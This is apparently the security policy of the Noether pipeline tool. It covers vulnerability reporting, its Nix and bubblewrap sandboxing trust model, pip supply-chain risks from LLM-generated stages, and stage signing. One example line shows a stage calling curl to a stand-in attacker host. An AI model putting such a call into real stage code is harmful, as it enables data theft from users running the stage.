# Security Policy

## Reporting a Vulnerability

If you find a security bug in Noether, please report it privately via a
GitHub Security Advisory on <https://github.com/alpibrusl/noether> or email
`security@alpibru.com`. Do not open a public issue until a fix has shipped.

Include: description, steps to reproduce, affected version, your PoC if any.

## Supported Versions

| Version | Status                 |
|---------|------------------------|
| 0.4.x   | Active — security fixes backported |
| < 0.4   | Not supported          |

## Trust Model

Noether's L1 (Nix Execution Layer) provides **reproducibility, not
isolation**. This is the single most important thing to understand before
running any stage you did not write.

### What the Nix-pinned runtime does

- Pins the exact language runtime (Python, Node, Bash) and its declared
  dependencies to content-addressed Nix store paths.
- Guarantees the same stage produces the same output on any host that has
  Nix and the matching store paths.
- Blocks network access during **Nix evaluation** (build time).

### What it does NOT do by default

- **It does not sandbox the subprocess** when `--isolate=none`. A stage
  without isolation inherits the host user's filesystem access,
  network, environment, and process privileges. A stage can legally do
  `import os; os.system("curl attacker.example/...")`.
- The `__direct__` venv fallback (used when a stage declares
  `# requires:` pip packages) bypasses Nix entirely and runs in the
  host's Python.

### What isolation adds (v0.7+)

`noether run --isolate=auto` (the default from v0.7) wraps each stage
subprocess in a sandbox. Phase 1 uses **bubblewrap** when available:

- Fresh user, PID, mount, UTS, IPC, and cgroup namespaces.
- UID and GID mapped to `nobody` (65534), so the stage can't observe
  the invoking user's real UID and can't regain privileges via
  `setuid(0)` — also blocked by `--cap-drop ALL`.
- Read-only bind of `/nix/store`; a sandbox-private tmpfs as `/work`.
  Nothing outside `/work` is writable, and the work dir leaves no
  host-side residue.
- Fresh network namespace unless the stage declares `Effect::Network`.
  When network is enabled, `/etc/resolv.conf`, `/etc/hosts`,
  `/etc/nsswitch.conf`, and `/etc/ssl/certs` are bound read-only (via
  `--ro-bind-try`, which no-ops on systems that route those
  differently, e.g. NixOS) so DNS and TLS actually work.
- All Linux capabilities dropped.
- New session (`--new-session`) so the stage can't signal the
  invoking shell's process group.
- Environment cleared; only an allowlist (`PATH`, `HOME`, `NIX_PATH`,
  `NIX_SSL_CERT_FILE`, locale vars, `RUST_LOG`) is passed through —
  and `HOME` / `USER` are overridden to sandbox-consistent values
  (`/work` and `nobody`) so processes that rely on them see a
  coherent identity.
- `--require-isolation` (and `NOETHER_REQUIRE_ISOLATION=1`) turns
  the auto-fallback-to-none warning into a hard error — use in CI
  and production.

Phase 2 (v0.8) replaces the bwrap wrapper with direct `unshare` +
Landlock + seccomp syscalls — same policy, ~10× lower startup cost, no
external binary. Design: `docs/roadmap/2026-04-18-stage-isolation.md`.

`--isolate=none` restores legacy behaviour. It emits a loud warning
unless `--unsafe-no-isolation` is also passed.

**Caveat — nix must be installed under `/nix/store`.** The sandbox
binds `/nix/store` and the noether cache dir only. A distro-packaged
nix at `/usr/bin/nix` is dynamically linked against host libraries
that aren't bound; rather than widen the bind set (which would
re-expose suid binaries), the executor refuses to run under
isolation in that case with a message pointing the operator at the
upstream or Determinate nix installer.

### What this means in practice

**Safe** (with the default `--isolate=auto` + bubblewrap installed):
running stdlib stages, running LLM-synthesized stages you haven't
audited yet, running any stage whose declared effects match what it
actually does. The sandbox blocks filesystem escape, arbitrary
network calls, and credential theft.

**Still risky, even with isolation**: stages declared `Effect::Network`
can still call arbitrary URLs — the sandbox only decides whether
network is reachable at all, not where to. Audit network-effect stages
or run them with per-stage URL allowlisting (not yet in v0.7 — tracked
as follow-up).

**Without isolation** (`--isolate=none`): same posture as pre-v0.7 —
suitable only for stages you wrote and audited yourself.

## Composition Verification

The composition engine type-checks every edge of a graph before executing
it, using structural subtyping. **This verifies graph topology only.** It
does not verify that a stage's implementation honours its declared
signature — a Python stage typed as `Text → Number` can return a string at
runtime.

Said differently:
- The type checker catches: `Sequential(a, b)` where `a.output` is not a
  subtype of `b.input`.
- The type checker does **not** catch: a stage body that returns the wrong
  shape, crashes, or silently swallows an error.

## LLM-generated Stage Requirements

The Nix executor reads `# requires: pkg==version` headers from Python
stage bodies to build a venv with pip-installed dependencies. For stages
synthesized by an LLM (or any untrusted author), this is a supply-chain
hazard — typosquatted or malicious package names can be injected.

Mitigations in place:
- Each `# requires:` entry is validated for character set (letters, digits,
  `_`, `-`, `.`, and a limited set of version punctuation).
- Package pinning (`pkg==version`) is required by default. Without pinning,
  the entry is rejected and the runtime falls back to the default
  Nix-provided Python (no pip installs).
- `NOETHER_ALLOW_UNPINNED_PIP=1` lifts the pinning requirement for local
  dev only. Do not set this in production.

Not mitigated (yet):
- There is no allowlist of known-good package names.
- There is no hash verification (`pip install --require-hashes`).
- Once a valid spec passes validation, pip downloads from PyPI using the
  ambient pip configuration.

If you are publishing compositions others will run via this registry,
review every `# requires:` entry before tagging as `Active`.

## Networked Components

Noether itself ships no network listeners. The `noether` CLI is a local
tool. A separate repository (`noether-cloud`) hosts the registry server;
its trust model is documented in [`noether-cloud/SECURITY.md`](https://github.com/alpibrusl/noether-cloud/blob/main/SECURITY.md)
(if you have access).

## Signing

Stages may carry an Ed25519 signature over their canonical signature
bytes. `noether stage verify <id> --signatures` checks the signature
against the declared pubkey. See `noether-core/src/stage/signing.rs`
for details. Without `--signatures` the `verify` command checks both
signatures and declarative properties (M2+ — see STABILITY.md).

Signing proves who signed the stage and that its signature bytes have not
been tampered with. It does **not** prove the implementation does what the
description says.
